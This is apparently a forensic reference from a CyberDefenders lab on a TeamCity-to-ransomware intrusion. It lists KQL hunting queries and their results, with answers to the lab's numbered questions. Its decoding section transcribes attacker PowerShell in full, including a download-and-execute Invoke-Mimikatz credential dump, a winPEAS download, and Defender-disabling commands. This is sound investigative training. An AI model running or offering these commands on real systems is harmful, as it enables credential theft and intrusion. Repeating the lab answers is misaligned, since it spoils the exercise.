# Analysis Tools and Methods – TeamCity APT Ransomware Investigation

**Document Type:** Reference  
**Case ID:** 010-teamcity-apt-ransomware-lateral-movement  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## Overview

This document lists the platform, data sources and methods shown in the case record, and reproduces the recorded queries.

## Platform and Data Sources

- Elastic (Kibana Discover and field statistics), queried with KQL
- Sysmon Event IDs 1, 7 and 11
- PowerShell script-block logging, Event ID 4104
- Windows Security Event ID 4698, and Event ID 4688 in one query
- Task Scheduler Event IDs 106, 200 and 201
- MSSQL Event IDs 18456 and 15457
- HTTP data in the `nginx_rp` data view

## Recorded Queries

Each query is reproduced exactly as recorded, with typographic normalisation only (zero-width spaces removed, curly quotes straightened). Line breaks follow the record.

### Q1 — File names with more than one extension

```text
event.code:11 and event.provider:"Microsoft-Windows-Sysmon"
and file.name:*.*.*
```

Result: the `.lsoc` extension (Q1 answer).

### Q3 — TeamCity references in HTTP data

```text
event.category:network and network.protocol:http and (
url.full:(*teamcity* or *jetbrain*) or
url.domain:(*teamcity* or *jetbrain*) or
url.path:(*teamcity* or *jetbrain*) or
http.request.referrer:(*teamcity* or *jetbrain*) or
http.request.body.content:(*teamcity* or *jetbrain*) or
http.response.body.content:(*teamcity* or *jetbrain*)
)
```

Result: referrer and `url.full` statistics in the `nginx_rp` data view; the compromised TeamCity URL host is `jb[.]cyberrange[.]cyberdefenders[.]org` (Q3 answer).

### Q7 — Download and encoded-command terms in PowerShell script blocks

```text
event.code: 4104 AND message: (*downloadstring* OR *download* OR
*Invoke-Expression* OR *IEX* OR *-exec* OR *-ExecutionPolicy* OR
*-EncodedCommand* OR *-enc* OR *-nop*)
```

Result: the recorded query for the defence-evasion question; its results are not listed separately in the record.

### Q7 — `Set-MpPreference` in PowerShell script blocks

```text
(event.code:4104 or winlog.event_id:4104)
and (
powershell.file.script_block_text:*set-mppreference* or
winlog.event_data.ScriptBlockText:*set-mppreference* or
message:*set-mppreference*
)
```

Result: script blocks running `Set-MpPreference -DisableRealtimeMonitoring` and `-ExclusionPath`; technique T1562.001 (Q7 answer).

### Q9 — PowerShell and attacker-address command lines on JB01

```text
event.provider: "Microsoft-Windows-Sysmon" and event.code:1 and
host.ip:10.10.3.4 and (process.name:powershell.exe or
process.command_line:(*3.90.168.151* or *3.90.168.151*))
```

Result: 35 of 38 records carry `process.command_line`, among them the tunnel binary `C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe` with `-connect` to the attacker address on port 8443 and a password argument. The password is withheld from this case.

### Q12 — Remote process creation

```text
process.name : ("wmic.exe" or "powershell.exe" or "cmd.exe" or
"rundll32.exe" or "regsvr32.exe" or "mshta.exe" or "schtasks.exe" or
"psexec.exe" or "at.exe") and process.command_line: *process call create*
```

Result: 18 records with 8 distinct command lines, all `wmic /node` executions from `cmd.exe` against four internal addresses; the LOLBIN is `wmic` (Q12 answer).

### Q17 — Scheduled-task registrations on DC01

```text
event.code:106 and host.ip: 10.10.0.4
```

Result: tasks `SubmitReporting` and `Scheduled AutoCheck` (Q17 answer).

### Q23 — Failed MSSQL logins on the SQL server

```text
host.ip:"10.10.0.6" AND event.code:18456
```

Result: 2,062 events (Q23 answer).

### Q28 — Modules loaded by `rundll32.exe` on the SQL server

```text
host.ip:"10.10.0.6" AND event.code:7 AND process.name:"rundll32.exe" AND
(file.name:*.dll OR file.path:*\\System.* OR file.path:*\\Microsoft.*) AND
(file.path:*\\mscoree.dll OR file.path:*\\clr.dll OR
file.path:*\\clrjit.dll OR file.path:*\\mscorlib.dll OR
file.path:*\\System.*)
```

Result: `rundll32.exe` loads `clrjit.dll` at 04:31:14.890; the technique is T1620 (Q28 answer).

### Q35 — Commands from `smss64.exe` that reference FS01

```text
(process.parent.name:smss64.exe OR parent.process.name:smss64.exe OR
process.name:smss64.exe OR process.command_line:(*smss64.exe*)) AND
process.command_line:(*10.10.0.7* OR "*\\10.10.0.7\\*" OR
"*\\\\10.10.0.7\\\\*")
```

Result: `wmic /node` against FS01 starting `rundll32` with `AddressResourcesSpec.dll` (Q35 answer).

### Q37 — Files with the `.lsoc` extension

```text
event.code:11 and event.provider:"Microsoft-Windows-Sysmon"
and file.name:*.*.lsoc
```

Result: no answer to Q37 is recorded.

## Decoding

Encoded PowerShell was decoded with base64decode.org. Decoded commands transcribed from the screenshots:

Q13, JB01: `(New-Object System.Net.WebClient).DownloadFile(...)` from `http[:]//3[.]90[.]168[.]151:80/java64[.]exe` to `C:\TeamCity\jre\bin\java64.exe`, followed by `Start-Process` on the same path. The source URL is defanged in this document.

Q10, JB01:

```text
New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

Q27, SQL server:

```text
(New-Object Net.WebClient).DownloadFile('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe', 'C:\Windows\Temp\peas.exe')
```

Q33, DC01:

```text
IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -Command 'privilege::debug lsadump::cache lsadump::secrets lsadump::sam sekurlsa::logonpasswords'
```

Further decoded output is shown for Q14 (`Get-WindowsDriver -Online -All`), Q29 and Q30 (`EDRSandblast.exe` with `GDRV.sys` against `lsass.exe`) and Q31 (the dump file compressed and then deleted).

## Command-Line Review

Built-in Windows binaries in the recorded command lines: `cmd.exe`, `wmic`, `rundll32`, `nltest` and `vssadmin`.

## MITRE ATT&CK

- T1562.001 (Q7) and T1620 (Q28) are recorded answers.
- Other behaviour in this case is described without technique identifiers.
